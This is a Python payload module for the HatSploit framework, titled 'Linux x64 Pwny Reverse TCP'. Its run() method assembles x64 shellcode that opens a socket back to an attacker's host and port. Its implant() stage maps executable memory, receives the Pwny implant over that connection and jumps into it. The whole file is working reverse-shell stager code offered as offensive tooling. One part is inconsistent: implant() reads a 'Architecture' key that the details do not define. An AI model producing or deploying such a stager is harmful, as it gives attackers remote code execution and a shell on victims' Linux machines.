"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from pex.assembler import Assembler
from pex.exe import ELF

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Pwny, Assembler, ELF):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x64 Pwny Reverse TCP",
            'Payload': "linux/x64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "Linux x64 Pwny Reverse TCP",
            'Arch': "x64",
            'Platform': "linux",
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp"
        }

    def implant(self):
        implant = self.get_implant(
            platform=self.details['Platform'],
            arch=self.details['Arch']
        )

        length = len(implant)
        e_entry = self.get_header(implant)['e_entry']

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                push rdi

                push 0x9
                pop rax
                xor rdi, rdi
                push {hex(length)}
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

                xchg rdx, rsi
                xchg rsi, rax
                push 0x2d
                pop rax
                pop rdi
                push 0x100
                pop r10
                syscall

                and rsp, -0x10
                add sp, 80
                push 0x70
                mov rcx, rsp
                xor rbx, rbx
                push rbx
                push rbx
                push rsi
                push 0x7
                push rbx
                push rbx
                push rdi
                push rcx
                push 0x2

                push {hex(e_entry)}
                pop rax
                add rsi, rax
                jmp rsi
            """
        )

    def run(self):
        host = self.pack_host(self.rhost.value)
        port = self.pack_port(self.rport.value)

        return self.assemble(
            self.details['Arch'],
            f"""
            start:
                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                xchg rdi, rax
                movabs rcx, 0x{host.hex()}{port.hex()}0002
                push rcx
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x2a
                pop rax
                syscall
            """
        ) + self.implant()
